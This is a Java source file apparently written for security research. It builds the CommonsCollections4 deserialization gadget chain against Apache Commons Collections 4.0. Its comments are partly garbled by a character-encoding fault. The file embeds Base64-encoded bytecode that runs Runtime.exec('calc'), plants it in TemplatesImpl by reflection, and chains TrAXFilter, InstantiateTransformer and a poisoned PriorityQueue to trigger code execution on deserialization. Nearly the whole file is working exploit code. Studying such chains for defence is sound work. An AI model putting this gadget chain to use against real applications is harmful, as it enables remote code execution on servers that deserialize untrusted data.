package CC;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;


public class CommonsCollections4 {
    public static void main(String[] args) {

        /**
         *���Ի�����4.0��jdk7u21����ǰ
         * ���� CC2 ˵����Ϊ CommonsCollections4 ��4.0�������汾ȥ���� InvokerTransformer �� Serializable �̳У�
         * �����޷����л������������Ƿ���Բ�ʹ�� InvokerTransformer �أ����Ǳ����� CC4
         *
         * ->PriorityQueue.readObject()
         *       ->PriorityQueue.heapify()
         *           ->PriorityQueue.siftDown()
         *             ->PriorityQueue.siftDownUsingComparator()
         *                  ->TransformingComparator.compare()
         *                     ->ChainedTransformer.transform()
         *                         ->ConstantTransformer.transform()
         *                                     ->InstantiateTransformer.transform()
         *                              ->TrAXFilter.TrAXFilter()
         *                                  ->TemplatesImpl.newTransformer()
         *                                         ->��������
         */
        try {
            //�ֽ���
            byte[] code = Base64.decode("yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAUTEhlbGxvVGVtcGxhdGVzSW1wbDsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAKAAQADAANAA8AEAANABEADgAVABAADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFAANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGAANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj");

            //�������� Field
            TemplatesImpl templates = new TemplatesImpl();
            setFieldValue(templates, "_bytecodes", new byte[][]{code});
            setFieldValue(templates, "_name", "HelloTemplatesImpl");
            setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

            //Transformer����
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(TrAXFilter.class),
                    new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
            };

            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            //��cc-2��ȣ�new InvokerTransformer���û�����Chain����
            TransformingComparator comparator = new TransformingComparator(chainedTransformer);

            PriorityQueue priorityQueue = new PriorityQueue(2);
            //������Ϊ��������ֵ���������ͨ��setFieldValue�޸�
            priorityQueue.add(1);
            priorityQueue.add(2);

            //��������Field��������������ݱȽ�������
            Object[] objects = new Object[]{templates, templates};
            setFieldValue(priorityQueue, "queue",objects);
            setFieldValue(priorityQueue, "comparator", comparator);

            //���л�
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(priorityQueue);
            oos.flush();
            oos.close();

            //���Է����л�
            ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
            ois.close();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void setFieldValue(Object object, String fieldName, Object value) {
        try {
            Field field = object.getClass().getDeclaredField(fieldName);
            field.setAccessible(true);
            field.set(object, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
